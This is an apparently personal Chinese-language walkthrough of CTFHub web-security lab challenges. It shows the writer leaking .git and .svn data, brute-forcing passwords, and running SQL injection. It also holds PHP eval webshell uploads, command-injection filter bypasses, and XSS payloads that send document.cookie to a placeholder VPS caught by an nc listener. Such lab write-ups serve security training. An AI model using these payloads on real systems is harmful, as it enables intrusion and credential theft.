
### 信息泄露 - 请求方式

根据提示，使用 `CTFHUB` 方式请求

```bash
$ curl -X CTFHUB "http://challenge-bf4d629e27103c15.sandbox.ctfhub.com:10800/index.php"
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8"/>
    <title>CTFHub HTTP Method</title>
</head>
<body>

good job! ctfhub{0014f3ea8e1e7150b94cda4b}

</body>
</html>
```

flag: `ctfhub{0014f3ea8e1e7150b94cda4b}`

### 信息泄露 - 302 跳转

根据提示是重定向，不要 follow redirect 就可以了

```bash
$ curl -i "http://challenge-6e0231db9072babf.sandbox.ctfhub.com:10800/index.php"
HTTP/1.1 302 Moved Temporarily
Server: openresty/1.21.4.2
Date: Thu, 19 Dec 2024 08:51:03 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
X-Powered-By: PHP/5.6.40
Location: /index.html
Access-Control-Allow-Origin: *
Access-Control-Allow-Headers: X-Requested-With
Access-Control-Allow-Methods: *

ctfhub{fe6f22b094da541943d34f68}
```

flag: `ctfhub{fe6f22b094da541943d34f68}`

### 信息泄露 - Cookie

```bash
$ curl -i "http://challenge-69089ea35fc8ddac.sandbox.ctfhub.com:10800/"
HTTP/1.1 200 OK
Server: openresty/1.21.4.2
Date: Thu, 19 Dec 2024 08:52:15 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
X-Powered-By: PHP/5.6.40
Set-Cookie: admin=0
Access-Control-Allow-Origin: *
Access-Control-Allow-Headers: X-Requested-With
Access-Control-Allow-Methods: *

hello guest. only admin can get flag.
```

可以看到有个 cookie: `admin=0`。修改成 `admin=1`:

```bash
$ curl -i -H "Cookie: admin=1" "http://challenge-69089ea35fc8ddac.sandbox.ctfhub.com:10800/"
HTTP/1.1 200 OK
Server: openresty/1.21.4.2
Date: Thu, 19 Dec 2024 08:53:19 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
X-Powered-By: PHP/5.6.40
Access-Control-Allow-Origin: *
Access-Control-Allow-Headers: X-Requested-With
Access-Control-Allow-Methods: *

ctfhub{71c22e974f97fc93ec070b99}
```

flag: `ctfhub{71c22e974f97fc93ec070b99}`

### 信息泄露 - 基础认证

```bash
$ curl -i "http://challenge-9ab9e243ade97b54.sandbox.ctfhub.com:10800/flag.html"
HTTP/1.1 401 Unauthorized
Server: openresty/1.21.4.2
Date: Thu, 19 Dec 2024 08:54:25 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 179
Connection: keep-alive
WWW-Authenticate: Basic realm="Do u know admin ?"

<html>
<head><title>401 Authorization Required</title></head>
<body>
<center><h1>401 Authorization Required</h1></center>
<hr><center>nginx/1.16.1</center>
</body>
</html>
```

看到 `WWW-Authenticate: Basic realm="Do u know admin ?"`

查一下 `WwW-Authenticate` 这个 header 的文档，大致意思是，对于用户输入的账号 `admin` 和密码 `pass`，做以下处理：
1. 拼接成一个字符串，用冒号隔开：`admin:pass`
2. base64 encode：`YWRtaW46cGFzcwo=`
3. 在请求头中带上凭证：`Authorization: Basic YWRtaW46cGFzcwo=`

同时还给了一个附件，常见弱口令 top 100，那么题目要求就非常清晰了，写几行代码爆破一下就可以了

```python
import requests
import base64

wordlist: str = """
123456
password
line
12345678
qwerty
123456789
12345
1234
111111
1234567
<omitted ...>
"""

for mpass in wordlist.split("\n"):
    mkey = base64.b64encode(f"admin:{mpass}".encode()).decode()
    print(f"Trying: {mpass}")
    resp = requests.get(
        "http://challenge-9ab9e243ade97b54.sandbox.ctfhub.com:10800/flag.html",
        headers= {
            "Authorization": f"Basic {mkey}"
        }
    )
    if resp.status_code != 401:
        print(resp.headers)
        print(resp.text)
        break
```

```bash
<omitted ...>
Trying: 1234567
Trying: dragon
Trying: 123123
Trying: baseball
{'Server': 'openresty/1.21.4.2', 'Date': 'Thu, 19 Dec 2024 09:13:52 GMT', 'Content-Type': 'text/html; charset=utf-8', 'Transfer-Encoding': 'chunked', 'Connection': 'keep-alive', 'Last-Modified': 'Thu, 19 Dec 2024 08:53:47 GMT', 'ETag': 'W/"6763df1b-21"', 'Access-Control-Allow-Origin': '*', 'Access-Control-Allow-Headers': 'X-Requested-With', 'Access-Control-Allow-Methods': '*', 'Content-Encoding': 'gzip'}
ctfhub{705a46bedb9bbd76d64baf73}
```

flag: `ctfhub{705a46bedb9bbd76d64baf73}`

### 信息泄露 - 响应包源代码

不用开游戏，直接翻 html 源代码就可以看到 flag

flag: `ctfhub{6ad3eb5fe2ea7d5b236b8cba}`

### 信息泄露 - 目录遍历

```bash
$ curl "http://challenge-b89bdb40dfbfe07c.sandbox.ctfhub.com:10800/flag_in_here/4/2/flag.txt"
ctfhub{3fa42395c00b66ed7c32fa09}
```

flag: `ctfhub{3fa42395c00b66ed7c32fa09}`

### 信息泄露 - PHPINFO

直接网页搜索就好了

flag: `ctfhub{f9c8cec1765b37b862dcc4fa}`

### 信息泄露 - 网站源码

根据题目描述，给了可能的文件名和后缀，那么，开始爆破吧

```python
import requests
import typing
import itertools

exts: typing.List[str] = [
    'tar', 'tar.gz', 'zip', 'rar'
]

filenames: typing.List[str] = [
    'web', 'website', 'backup', 'back', 'www', 'wwwroot', 'temp'
]

combinations: typing.List[str] = ['{}.{}'.format(filename, ext) for filename, ext in itertools.product(filenames, exts)]

for f in combinations:
    url: str = f"http://challenge-57f733049705e700.sandbox.ctfhub.com:10800/{f}"
    resp = requests.get(url)
    print(f"Trying: {f}")
    if (resp.status_code == 200):
        print(f"Found: {f}")
        with open(f, 'wb') as file:
            file.write(resp.content)
        break
```

```bash
<omitted ...>
Trying: back.rar
Trying: www.tar
Trying: www.tar.gz
Trying: www.zip
Found: www.zip
```

下载解压文件，有个叫 `flag_255227411.txt` 的文件

```bash
$ curl "http://challenge-57f733049705e700.sandbox.ctfhub.com:10800/flag_255227411.txt"
ctfhub{7f5b8ac5b1a9068f814f0217}
```

flag: `ctfhub{7f5b8ac5b1a9068f814f0217}`

### 信息泄露 - bak 文件

```bash
$ curl "http://challenge-aec80717f912ca94.sandbox.ctfhub.com:10800/index.php.bak"
<!DOCTYPE html>
<html>
<head>
    <title>CTFHub 备份文件下载 - bak</title>
</head>
<body>
<?php

// FLAG: ctfhub{7eca46b4361c84fb3cc5279c}

echo "Flag in index.php source code.";
?>
</body>
</html>
```

flag: `ctfhub{7eca46b4361c84fb3cc5279c}`

### 信息泄露 - vim 缓存

```
$ wget "http://challenge-917fe927c2514035.sandbox.ctfhub.com:10800/.index.php.swp"

$ vim -r .index.php.swp
```

flag: `ctfhub{25bbafd258dfb2d994e43f46}`

### 信息泄露 - .DS_Store

找个工具一把梭：

```bash
$ pipenv run dumpall -u "http://challenge-ee2c7af2b2b35097.sandbox.ctfhub.com:10800/.DS_Store"

       ___                  ___   __   __ 
      / _ \__ ____ _  ___  / _ | / /  / / 
     / // / // /  ' \/ _ \/ __ |/ /__/ /__
    /____/\_,_/_/_/_/ .__/_/ |_/____/____/
                   /_/                    

    https://github.com/0xHJK/dumpall
    --------------------------------------------- 
                                       v0.3.2 HJK

Target: http://challenge-ee2c7af2b2b35097.sandbox.ctfhub.com:10800/.DS_Store
Output Directory: /home/kazusa/playground/challenge-ee2c7af2b2b35097.sandbox.ctfhub.com_10800

Module: dumpall.addons.dsdumper

[200] http://challenge-ee2c7af2b2b35097.sandbox.ctfhub.com:10800/aa050c423974ee3125db054c5d76bb6b.txt aa050c423974ee3125db054c5d76bb6b.txt
```

flag: `ctfhub{366885c612a6ddd17ba317cb}`

### 信息泄露 - Log

```bash
$ curl "http://challenge-33d2dab378983665.sandbox.ctfhub.com:10800/.git/logs/HEAD"
0000000000000000000000000000000000000000 3978780ede2ef9b711101198f88feaa05d074f3d CTFHub <sandbox@ctfhub.com> 1734602862 +0000	commit (initial): init
3978780ede2ef9b711101198f88feaa05d074f3d 05482e6b3a7fd31b7070135e6f0a9779b00ad490 CTFHub <sandbox@ctfhub.com> 1734602862 +0000	commit: add flag
05482e6b3a7fd31b7070135e6f0a9779b00ad490 a27987a9c3598c7ac256bd86e105193d14bbe608 CTFHub <sandbox@ctfhub.com> 1734602862 +0000	commit: remove flag
```

可以得知在 commit `05482e6b3a7fd31b7070135e6f0a9779b00ad490` 添加了 flag 文件

```bash
$ wget "http://challenge-33d2dab378983665.sandbox.ctfhub.com:10800/.git/objects/05/482e6b3a7fd31b7070135e6f0a9779b00ad490"

$ zlib-flate -uncompress < 482e6b3a7fd31b7070135e6f0a9779b00ad490 > output

$ cat output
commit 211tree 4f76c2d615138379c60b01fe1f431a6faaa221f3
parent 3978780ede2ef9b711101198f88feaa05d074f3d
author CTFHub <sandbox@ctfhub.com> 1734602862 +0000
committer CTFHub <sandbox@ctfhub.com> 1734602862 +0000

add flag
```

可以得知这次 commit 的 tree id 为 `4f76c2d615138379c60b01fe1f431a6faaa221f3`。继续下载这个文件：

```bash
$ wget "http://challenge-33d2dab378983665.sandbox.ctfhub.com:10800/.git/objects/4f/76c2d615138379c60b01fe1f431a6faaa221f3"

$ zlib-flate -uncompress < 76c2d615138379c60b01fe1f431a6faaa221f3 > output

$ xxd output
00000000: 7472 6565 2031 3231 0031 3030 3634 3420  tree 121.100644
00000010: 3130 3632 3731 3434 3839 3233 3835 322e  106271448923852.
00000020: 7478 7400 7ea4 4e76 376b db62 ab87 cc7a  txt.~.Nv7k.b...z
00000030: b101 94c1 4973 daa0 3130 3036 3434 2035  ....Is..100644 5
00000040: 3078 2e68 746d 6c00 9071 e0a2 4f65 4c88  0x.html..q..OeL.
00000050: aa97 a227 3ca5 95e3 01b7 ada5 3130 3036  ...'<.......1006
00000060: 3434 2069 6e64 6578 2e68 746d 6c00 2c59  44 index.html.,Y
00000070: e302 4e3b c350 9767 7820 4928 a21d 9ff4  ..N;.P.gx I(....
00000080: 2d01
```

得知这次 commit 中有个叫做 `106271448923852.txt` 的文件，哈希为 `7ea44e76376bdb62ab87cc7ab10194c14973daa0`

下载还原这个文件：

```bash
$ wget "http://challenge-33d2dab378983665.sandbox.ctfhub.com:10800/.git/objects/7e/a44e76376bdb62ab87cc7ab10194c14973daa0"

$ zlib-flate -uncompress < 7ea44e76376bdb62ab87cc7ab10194c14973daa0 > output

$ xxd output
00000000: 626c 6f62 2033 3300 6374 6668 7562 7b36  blob 33.ctfhub{6
00000010: 3635 6164 3731 3132 6238 3932 3934 6635  65ad7112b89294f5
00000020: 6661 3634 3766 367d 0a                   fa647f6}.
```

flag: `ctfhub{665ad7112b89294f5fa647f6}`

### 信息泄露 - Stash

```bash
$ curl "http://challenge-969c65bb8fb87c8e.sandbox.ctfhub.com:10800/.git/refs/stash"
60aca61375957983b9feccc84b3a9579be3f0d62

$ wget "http://challenge-969c65bb8fb87c8e.sandbox.ctfhub.com:10800/.git/objects/60/aca61375957983b9feccc84b3a9579be3f0d62"

$ zlib-flate -uncompress < aca61375957983b9feccc84b3a9579be3f0d62 > output

$ strings output
commit 281
tree b34c33de0d153cf72389bc66844a2291d8db3c0f
parent 5e2b7bbf9fb0db8f474396e2c32c11bc829e82b8
parent c62d9dea80687bfa4deaed96d8b8783c0bb989f4
author CTFHub <sandbox@ctfhub.com> 1734604766 +0000
committer CTFHub <sandbox@ctfhub.com> 1734604766 +0000
WIP on master: 5e2b7bb add flag
```

这次 commit 的 tree id 为 `b34c33de0d153cf72389bc66844a2291d8db3c0f`，同上下载分析文件：

```bash
$ wget "http://challenge-969c65bb8fb87c8e.sandbox.ctfhub.com:10800/.git/objects/b3/4c33de0d153cf72389bc66844a2291d8db3c0f"

$ zlib-flate -uncompress < 4c33de0d153cf72389bc66844a2291d8db3c0f > output

$ xxd output
00000000: 7472 6565 2031 3230 0031 3030 3634 3420  tree 120.100644
00000010: 3239 3535 3738 3530 3132 3230 3032 2e74  29557850122002.t
00000020: 7874 008f 4980 e11a cc6f 70c4 637d 8325  xt..I....op.c}.%
00000030: 0854 f006 d44b 5431 3030 3634 3420 3530  .T...KT100644 50
00000040: 782e 6874 6d6c 0090 71e0 a24f 654c 88aa  x.html..q..OeL..
00000050: 97a2 273c a595 e301 b7ad a531 3030 3634  ..'<.......10064
00000060: 3420 696e 6465 782e 6874 6d6c 002c 59e3  4 index.html.,Y.
00000070: 024e 3bc3 5097 6778 2049 28a2 1d9f f42d  .N;.P.gx I(....-
00000080: 01
```

叫做 `29557850122002.txt` 的文件，哈希为 `8f4980e11acc6f70c4637d83250854f006d44b54`

```bash
$ wget "http://challenge-969c65bb8fb87c8e.sandbox.ctfhub.com:10800/.git/objects/8f/4980e11acc6f70c4637d83250854f006d44b54"

$ zlib-flate -uncompress < 4980e11acc6f70c4637d83250854f006d44b54 > output

$ strings output
blob 33
ctfhub{7f3bae4a37ae8a6ced71528d}
```

flag: `ctfhub{7f3bae4a37ae8a6ced71528d}`

### 信息泄露 - index

```bash
$ wget "http://challenge-7e8654a5da958626.sandbox.ctfhub.com:10800/.git/index"

$ xxd index
00000000: 4449 5243 0000 0002 0000 0003 6764 03ae  DIRC........gd..
00000010: 0000 0000 6764 03ae 0000 0000 0020 0063  ....gd....... .c
00000020: 0026 094e 0000 81a4 0000 0000 0000 0000  .&.N............
00000030: 0000 0021 586c 7b38 9190 12b4 1525 417b  ...!Xl{8.....%A{
00000040: 1479 b7b2 f539 e063 0011 3434 3031 3633  .y...9.c..440163
00000050: 3235 3133 3236 312e 7478 7400 6516 36f6  2513261.txt.e.6.
00000060: 0000 0000 5e07 63c7 0000 0000 0020 0063  ....^.c...... .c
00000070: 0024 3652 0000 81a4 0000 0000 0000 0000  .$6R............
00000080: 0000 01ee 9071 e0a2 4f65 4c88 aa97 a227  .....q..OeL....'
00000090: 3ca5 95e3 01b7 ada5 0008 3530 782e 6874  <.........50x.ht
000000a0: 6d6c 0000 6516 80fc 0000 0000 5e48 ecac  ml..e.......^H..
000000b0: 0000 0000 0020 0063 0024 36a0 0000 81a4  ..... .c.$6.....
000000c0: 0000 0000 0000 0000 0000 008f 2c59 e302  ............,Y..
000000d0: 4e3b c350 9767 7820 4928 a21d 9ff4 2d01  N;.P.gx I(....-.
000000e0: 000a 696e 6465 782e 6874 6d6c 0000 0000  ..index.html....
000000f0: 0000 0000 5452 4545 0000 0019 0033 2030  ....TREE.....3 0
00000100: 0a67 0b73 f9a9 565e bda1 b0c5 29ad f332  .g.s..V^....)..2
00000110: d150 f33d b74c d232 3b23 a84e de95 3c90  .P.=.L.2;#.N..<.
00000120: 3e2a e3c1 949f f231 90                   >*.....1.
```

有一个叫做 `4401632513261.txt` 的文件，哈希为 `586c7b38919012b41525417b1479b7b2f539e063`

```bash
$ wget "http://challenge-7e8654a5da958626.sandbox.ctfhub.com:10800/.git/objects/58/6c7b38919012b41525417b1479b7b2f539e063"

$ zlib-flate -uncompress < 6c7b38919012b41525417b1479b7b2f539e063 > output

$ strings output
blob 33
ctfhub{4810073b50315a6ad0ca5286}
```

flag: `ctfhub{4810073b50315a6ad0ca5286}`

### 信息泄露 - SVN 泄露

这年头谁还用 svn 啊，直接工具一把梭了：

[kost/dvcs-ripper: Rip web accessible (distributed) version control systems: SVN/GIT/HG...](https://github.com/kost/dvcs-ripper)

就是安装太麻烦了，可以考虑 docker 跑一个 ubuntu，然后跟着 readme 的指引安装使用就好了

```bash
$ docker run --rm -it ubuntu bash

root@b0517fda18c5:/# apt update

root@b0517fda18c5:/# apt-get install perl libio-socket-ssl-perl libdbd-sqlite3-perl libclass-dbi-perl libio-all-lwp-perl git subversion

root@b0517fda18c5:/# git clone https://github.com/kost/dvcs-ripper

root@b0517fda18c5:/dvcs-ripper# perl rip-svn.pl -v -u "http://challenge-d3a8103b9278a2d1.sandbox.ctfhub.com:10800/.svn/"

root@b0517fda18c5:/dvcs-ripper# grep -r ctfhub .svn
.svn/pristine/5e/5e8116795a635d1aff2c9460af57aa68ee02a77e.svn-base:ctfhub{665c9072041c4e31608e32a6}
grep: .svn/wc.db: binary file matches
```

flag: `ctfhub{665c9072041c4e31608e32a6}`

### 信息泄露 - HG 泄露

```bash
root@b0517fda18c5:/dvcs-ripper# perl rip-hg.pl -v -s -u "http://challenge-997bd931f11fecef.sandbox.ctfhub.com:10800/.hg/"

root@b0517fda18c5:/dvcs-ripper# grep -r flag .hg/
grep: .hg/dirstate: binary file matches
grep: .hg/store/00manifest.i: binary file matches
grep: .hg/store/undo: binary file matches
.hg/store/fncache:data/flag_370518041.txt.i
grep: .hg/undo.dirstate: binary file matches
.hg/last-message.txt:add flag

$ curl "http://challenge-997bd931f11fecef.sandbox.ctfhub.com:10800/flag_370518041.txt"
ctfhub{9a264f20c5f7724a0b509f9e}
```

flag: `ctfhub{9a264f20c5f7724a0b509f9e}`

### 密码口令 - 弱口令

跑了一下 top100 的密码本没跑出来，网上查了一下密码是 `admin888`。。。浓厚的老中味道

```python
import requests
import typing

wordlist_url = "https://raw.githubusercontent.com/kkrypt0nn/wordlists/refs/heads/main/wordlists/passwords/top_adobe_passwords.txt"

wordlist: typing.List[str] = [
    _ for _ in requests.get(wordlist_url).text.split("\n") if _ is not ''
]

for mpass in wordlist:
    if mpass == '': continue
    print(f"Trying: {mpass}")
    resp = requests.post(
        "http://challenge-cd89dd0061a2c67c.sandbox.ctfhub.com:10800/",
        data={
            'name': 'admin',
            'password': mpass
        }
    )
    if "user or password is wrong" not in resp.text:
        print(resp.headers)
        print(resp.text)
        break
```

flag: `ctfhub{605839de08da6a3d58c873de}`

###  密码口令 - 默认密码

😅网上找默认密码：`eyougw:admin@(eyou)`

flag: `ctfhub{690a50ae1d710046a37bbfa5}`

### SQL 注入 - 整数型注入

查询有哪些数据库：
```
-1 union select group_concat(schema_name), 2 from information_schema.schemata
```

查询 `sqli` 数据库下有哪些表：
```
-1 union select group_concat(table_name), 2 from information_schema.tables where table_schema = 'sqli'
```

查询 `sqli` 数据库下 flag 表中有哪些字段：
```
-1 union select group_concat(column_name), 2 from information_schema.columns where table_schema = 'sqli' and table_name = 'flag'
```

查询 `sqli` 数据库下 flag 表中，`flag` 字段的所有行
```
-1 union select group_concat(flag), 2 from flag
```

flag: `ctfhub{d9e2564dbd5ea3452e0cb73f}`

### SQL 注入 - 字符型注入

跟上一题没什么区别，只要注意引号对称就可以了

查询有哪些数据库：
```
-1' union select group_concat(schema_name), 2 from information_schema.schemata where '1'='1
```

查询 `sqli` 数据库下有哪些表：
```
-1' union select group_concat(table_name), 2 from information_schema.tables where table_schema='sqli
```

查询 `sqli` 数据库下 `flag` 表中，有哪些字段
```
-1' union select group_concat(column_name), 2 from information_schema.columns where table_schema='sqli' and table_name='flag
```

查询 `sqli` 数据库下 flag 表中，`flag` 字段的所有行
```
-1' union select group_concat(flag), 2 from flag where '1'='1
```

flag: `ctfhub{f79bdfdfaaf2bbc506f193fa}`

### SQL 注入 - 报错注入

使用 `updatexml` 构造报错
```
-1 union select updatexml(1, concat(0x7e, (select group_concat(flag) from flag), 0x7e), 1), 2
```

但疑似 flag 较长会被截断，保险一点分两次读：
```
-1 union select updatexml(1, concat(0x7e, (select substring(group_concat(flag), 1, 10) from flag), 0x7e), 1), 2
```

```
-1 union select updatexml(1, concat(0x7e, (select substring(group_concat(flag), 21, 20) from flag), 0x7e), 1), 2
```

flag: `ctfhub{b4d58c04c291bb402557bb70}`

### 文件上传 - 无验证

直接写个 php 一句话木马上传就行

```
http://challenge-ce68f5bafd33a92b.sandbox.ctfhub.com:10800/upload/index.php?x=echo `cat /var/www/html/flag_1648429041.php | base64`;
```

flag: `ctfhub{8c43bc94e39e9a8749eec390}`

### 文件上传 - 前端验证

拦截抓包改，或者改前端代码，都可以，然后剩下跟前面一样

flag: `ctfhub{3db33dfdceaeab70c35c6893}`

### 文件上传 - .htaccess

```
------WebKitFormBoundaryglP3qYgfAlD4p1Jg
Content-Disposition: form-data; name="file"; filename=".htaccess"
Content-Type: application/octet-stream

<FilesMatch "\.asd$">
	SetHandler application/x-httpd-php
</FilesMatch>

------WebKitFormBoundaryglP3qYgfAlD4p1Jg
```

flag: `ctfhub{5e91162d6d3f49c5114e25d0}`

### 文件上传 - MIME 绕过

```http
------WebKitFormBoundaryc6sfnDqiBhfIrJJ3
Content-Disposition: form-data; name="file"; filename="x.php"
Content-Type: image/jpeg

<?php eval($_GET['x']) ?>
------WebKitFormBoundaryc6sfnDqiBhfIrJJ3
```

flag: `ctfhub{ecc138377657a7a7d85b5ffc}`

### 文件上传 - 00 截断

```http
POST /?road=/var/www/html/upload/x.php%00 HTTP/1.1
Host: challenge-5c8669b200ad04c7.sandbox.ctfhub.com:10800
<omitted ...>


------WebKitFormBoundary8acXxWBRTBOzGgbP
Content-Disposition: form-data; name="file"; filename="file.jpg"
Content-Type: image/jpeg

<?php eval($_GET['x']) ?>
------WebKitFormBoundary8acXxWBRTBOzGgbP
Content-Disposition: form-data; name="submit"

Submit
------WebKitFormBoundary8acXxWBRTBOzGgbP--
```

flag: `ctfhub{f5ed51edabb7f16f4bb9cd05}`

### 文件上传 - 双写后缀

```http
POST / HTTP/1.1
Host: challenge-0a65a07548c11604.sandbox.ctfhub.com:10800
<omitted ...>

------WebKitFormBoundaryljnqMVE9VBBJvuzn
Content-Disposition: form-data; name="file"; filename="x.pphphp"
Content-Type: text/php

<?php eval($_GET['x']) ?>

------WebKitFormBoundaryljnqMVE9VBBJvuzn
Content-Disposition: form-data; name="submit"

Submit
------WebKitFormBoundaryljnqMVE9VBBJvuzn--

```

flag: `ctfhub{cf7e972cb23bbb9a0770dd53}`

### 文件上传 - 文件头检查

```http
POST / HTTP/1.1
Host: challenge-fe8477ea88d15ae4.sandbox.ctfhub.com:10800

<omitted ...>

------WebKitFormBoundary6ojWZlkI6ODJKZ9u
Content-Disposition: form-data; name="file"; filename="x.php"
Content-Type: image/png

PNG

<?php eval($_GET['x']) ?>
------WebKitFormBoundary6ojWZlkI6ODJKZ9u
Content-Disposition: form-data; name="submit"

Submit
------WebKitFormBoundary6ojWZlkI6ODJKZ9u--

```

flag: `ctfhub{ba9f2968dc4d10b625658cf9}`

### RCE - eval 执行

```
http://challenge-3158dabd28fa69fc.sandbox.ctfhub.com:10800/?cmd=echo `cat /flag_958`;
```

flag: `ctfhub{0e66b89e7ba97a96984a5b3c}`

### RCE - 文件包含

```
http://challenge-66d564295f77ed0d.sandbox.ctfhub.com:10800/?file=shell.txt&ctfhub=echo `cat /flag`;
```

flag: `ctfhub{5e5d635300ecc9ccb0c75919}`

### RCE - php://input

```http
POST /?file=php://input HTTP/1.1
Host: challenge-6a979e40b8164244.sandbox.ctfhub.com:10800
Content-Length: 30
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive

<?php echo `cat /flag_8394` ?>
```

flag: `ctfhub{48b99715a1112f985f8eb8c7}`

### RCE - 读取源代码

```
http://challenge-d9abda75f9ce5b83.sandbox.ctfhub.com:10800/?file=php://filter/convert.base64-encode/resource=/flag
```

flag: `ctfhub{3f8c25a251511c66b2d7e0a3}`

### RCE - 远程包含

```http
POST /?file=php://input HTTP/1.1
Host: challenge-943b038a589c1bd9.sandbox.ctfhub.com:10800
Content-Length: 30
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive

<?php echo `cat /flag` ?>
```

### RCE - 命令注入

```
http://challenge-5fd4db44e5c1be8b.sandbox.ctfhub.com:10800/?ip=127.0.0.1; rev 2335674783221.php
```

flag: `ctfhub{c63da4d8edca262d4cf0069c}`

### RCE - 过滤 cat

```
http://challenge-b8ee138fd67845e5.sandbox.ctfhub.com:10800/?ip=127.0.0.1; rev flag_550237935769.php
```

flag: `ctfhub{3a11f2cf231640c5c205b8e4}`

### RCE - 过滤空格

```
http://challenge-1338583f7d5af8b7.sandbox.ctfhub.com:10800/?ip=127.0.0.1;rev${IFS}flag_3505160011536.php
```

flag: `ctfhub{fb1a4c06563005e755fae46f}`


### RCE - 过滤目录分隔符

```
http://challenge-6e85540bab8c2376.sandbox.ctfhub.com:10800/?ip=127.0.0.1;rev flag_is_here$(printf "\57")flag_153751813715521.php
```

flag: `ctfhub{c77408574b64110dfacac99a}`

### RCE - 过滤运算符

```
http://challenge-6aa7ad1f926deb98.sandbox.ctfhub.com:10800/?ip=127.0.0.1;rev flag_17973434432590.php
```

```
http://challenge-6aa7ad1f926deb98.sandbox.ctfhub.com:10800/?ip=127.0.0.1%0arev flag_17973434432590.php
```

flag: `ctfhub{e3f9f6be1e920478b951d0e8}`

### RCE - 综合过滤练习

```
http://challenge-fda95211f14d1173.sandbox.ctfhub.com:10800/?ip=127.0.0.1%0acd${IFS}fl""ag_is_here%0arev${IFS}fl""ag_180112698215425.php
```

flag: `ctfhub{ec29bf0f00e0425afef94e09}`

### XSS - 反射型

```
http://challenge-42da80f82dbd8cb4.sandbox.ctfhub.com:10800/?name=bob</h1>

<script>

var img = new Image();
img.src = "http://YOUR_VPS_ADDR:1111/" + escape(document.cookie);
document.body.appendChild(img);

</script>

<h1>emm
```

VPS 上开个监听，然后把上面的 payload 提交

```shell
root@6ca7eb:~# nc -lvp 1111
Listening on [0.0.0.0] (family 0, port 1111)
Connection from 222.186.57.91 49621 received!
GET /flag%3Dctfhub%7Bc8aa84fbd8ee72e2d8cccc2f%7D HTTP/1.1
Host: YOUR_VPS_ADDR:1111
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/112.0.5615.138 Safari/537.36
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Referer: http://challenge-42da80f82dbd8cb4.sandbox.ctfhub.com:10800/
Accept-Encoding: gzip, deflate
Accept-Language: en-US
```

flag: `ctfhub{c8aa84fbd8ee72e2d8cccc2f}`

### XSS - 存储型

```
bob</h1>

<script>

var img = new Image();
img.src = "http://YOUR_VPS_ADDR:1111/" + escape(document.cookie);
document.body.appendChild(img);

</script>

<h1>emm

```

先 change name，提交上面的 payload

然后 vps 开监听，下面提交这个网页的网址就可以

```shell
root@-6ca7eb:~# nc -lvp 1111
Listening on [0.0.0.0] (family 0, port 1111)
Connection from 222.186.57.91 29599 received!
GET /flag%3Dctfhub%7Ba66002481465aececc3d69b6%7D HTTP/1.1
Host: YOUR_VPS_ADDR:1111
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/112.0.5615.138 Safari/537.36
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Referer: http://challenge-a395b18bd44e74a3.sandbox.ctfhub.com:10800/
Accept-Encoding: gzip, deflate
Accept-Language: en-US

```

flag: `ctfhub{a66002481465aececc3d69b6}`

### XSS - DOM 反射

首先翻一下源代码，客户端修改内容的代码是这样的：

```html
<script>
	$("#text")[0].innerHTML = 'asdasd';
</script>
```

所以有 payload：

```
bob';

var img = new Image();
img.src = "http://YOUR_VPS_ADDR:1111/" + escape(document.cookie);
document.body.appendChild(img);

'
```

```shell
root@-6ca7eb:~# nc -lvp 1111
Listening on [0.0.0.0] (family 0, port 1111)
Connection from 222.186.57.91 4774 received!
GET /flag%3Dctfhub%7B991562cd90e38072ba51495d%7D HTTP/1.1
Host: YOUR_VPS_ADDR:1111
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/112.0.5615.138 Safari/537.36
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Referer: http://challenge-886619cba6c3182b.sandbox.ctfhub.com:10800/
Accept-Encoding: gzip, deflate
Accept-Language: en-US
```

flag: `ctfhub{991562cd90e38072ba51495d}`

### XSS - DOM 跳转

跳转部分代码：

```html
<script>
	var target = location.search.split("=")
	if (target[0].slice(1) == "jumpto") {
		location.href = target[1];
	}
</script>
```

所以对应的 payload：

```
http://challenge-648e4b5b0920e51b.sandbox.ctfhub.com:10800/?jumpto=javascript:

(function(){
    fetch('http://YOUR_VPS_ADDR:1111/' + escape(document.cookie));
 })()

```

```shell
root@-6ca7eb:~# nc -lvp 1111
Listening on [0.0.0.0] (family 0, port 1111)
Connection from 222.186.57.91 10148 received!
GET /flag%3Dctfhub%7B7e36e6c4635a1b3893c4f9b0%7D HTTP/1.1
Host: YOUR_VPS_ADDR:1111
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/112.0.5615.138 Safari/537.36
Accept: */*
Origin: http://challenge-648e4b5b0920e51b.sandbox.ctfhub.com:10800
Referer: http://challenge-648e4b5b0920e51b.sandbox.ctfhub.com:10800/
Accept-Encoding: gzip, deflate
Accept-Language: en-US

```

flag: `ctfhub{7e36e6c4635a1b3893c4f9b0}`

### XSS - 过滤空格

```
http://challenge-4f558d3ce182d603.sandbox.ctfhub.com:10800/?name=

bob</h1><script>fetch('http://YOUR_VPS_ADDR:1111/'+document.cookie)</script><h1>emm
```


```shell
root@-6ca7eb:~# nc -lvp 1111
Listening on [0.0.0.0] (family 0, port 1111)
Connection from 222.186.57.91 30331 received!
GET /flag=ctfhub%7B6c4a04e48390234eab804ca9%7D HTTP/1.1
Host: YOUR_VPS_ADDR:1111
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/112.0.5615.138 Safari/537.36
Accept: */*
Origin: http://challenge-4f558d3ce182d603.sandbox.ctfhub.com:10800
Referer: http://challenge-4f558d3ce182d603.sandbox.ctfhub.com:10800/
Accept-Encoding: gzip, deflate
Accept-Language: en-US
```

flag: `ctfhub{6c4a04e48390234eab804ca9}`

### XSS - 过滤关键词

试一下双写能绕过

```
